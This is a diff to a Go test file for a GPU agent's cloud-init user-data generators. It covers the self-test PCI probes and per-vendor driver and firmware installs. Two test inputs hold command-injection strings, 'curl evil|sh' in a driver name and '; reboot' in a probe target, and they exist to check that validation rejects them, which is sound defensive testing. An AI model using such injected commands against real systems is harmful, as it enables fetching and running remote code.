@@ -55,10 +55,16 @@ func TestSelfTestUserDataProbes(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	for _, want := range []string{"gpuagent-selftest", "BLOCKED", "192.168.1.1:80", "nvidia-smi"} {
+	for _, want := range []string{"gpuagent-selftest", "BLOCKED", "192.168.1.1:80",
+		"/sys/bus/pci/devices/*", "0x03*|0x12*", "GPUAGENT-SELFTEST PCI $id $drv $mem ${d##*/} $unmapped", "mem_info_vram_total", "$d/resource", "fl & 0x200", "NVSMI"} {
 		if !strings.Contains(ud, want) {
 			t.Errorf("self-test user-data missing %q", want)
 		}
+	}
+	// nvidia-smi is optional in the VM: it may only ever add detail, never be
+	// what decides whether a GPU arrived.
+	if !strings.Contains(ud, "if command -v nvidia-smi") {
+		t.Errorf("the self-test runs nvidia-smi unconditionally")
 	}
 	if _, err := UserData("selftest", k, []string{"1.2.3.4:22; reboot"}); err == nil {
 		t.Errorf("a probe target carrying a command was accepted")
@@ -81,11 +87,11 @@ func TestHostnameIsGpuAndTheRentalIdsFirstEight(t *testing.T) {
 }
 
 func TestBakeUserData(t *testing.T) {
-	ud, err := BakeUserData("580-server-open")
+	ud, err := BakeUserData("580-server-open", []string{"10de"})
 	if err != nil {
 		t.Fatal(err)
 	}
-	for _, want := range []string{"nvidia-driver-580-server-open", "nvidia-utils-580-server", "cloud-init clean", "poweroff", "GPUAGENT-BAKE DONE"} {
+	for _, want := range []string{"nvidia-driver-580-server-open", "nvidia-utils-580-server", "linux-headers-generic", "cloud-init clean", "poweroff", "GPUAGENT-BAKE DONE"} {
 		if !strings.Contains(ud, want) {
 			t.Errorf("bake user-data missing %q", want)
 		}
@@ -95,8 +101,40 @@ func TestBakeUserData(t *testing.T) {
 			t.Errorf("ValidDriver(%q) = %v, want %v", d, !ok, ok)
 		}
 	}
-	if _, err := BakeUserData("580 && curl evil|sh"); err == nil {
+	if _, err := BakeUserData("580 && curl evil|sh", []string{"10de"}); err == nil {
 		t.Errorf("an unsafe driver name was accepted")
+	}
+}
+
+// Each make gets what its GPU needs inside the VM and nothing it does not: the
+// NVIDIA driver only for NVIDIA, the firmware the in-kernel amdgpu, i915 and xe
+// drivers load for AMD and Intel, and nothing for a make with nothing to add.
+func TestBakeUserDataPerVendor(t *testing.T) {
+	for name, c := range map[string]struct {
+		driver    string
+		vendors   []string
+		want, not []string
+	}{
+		"amd":    {NoDriver, []string{"1002"}, []string{"linux-firmware-amd-graphics", "GPUAGENT-BAKE DONE"}, []string{"nvidia", "intel-graphics"}},
+		"intel":  {NoDriver, []string{"8086"}, []string{"linux-firmware-intel-graphics"}, []string{"nvidia", "amd-graphics"}},
+		"mixed":  {DefaultDriver, []string{"8086", "10de"}, []string{"linux-firmware-intel-graphics", "nvidia-driver-580-server-open"}, []string{"amd-graphics"}},
+		"other":  {NoDriver, []string{"1ed5"}, []string{"GPUAGENT-BAKE DONE", "cloud-init clean", "rdma-core"}, []string{"nvidia", "linux-firmware"}},
+		"no gpu": {NoDriver, nil, []string{"GPUAGENT-BAKE DONE", "rdma-core"}, []string{"nvidia", "linux-firmware"}},
+	} {
+		ud, err := BakeUserData(c.driver, c.vendors)
+		if err != nil {
+			t.Fatalf("%s: %v", name, err)
+		}
+		for _, w := range c.want {
+			if !strings.Contains(ud, w) {
+				t.Errorf("%s: bake user-data missing %q", name, w)
+			}
+		}
+		for _, n := range c.not {
+			if strings.Contains(ud, n) {
+				t.Errorf("%s: bake user-data has %q", name, n)
+			}
+		}
 	}
 }
 
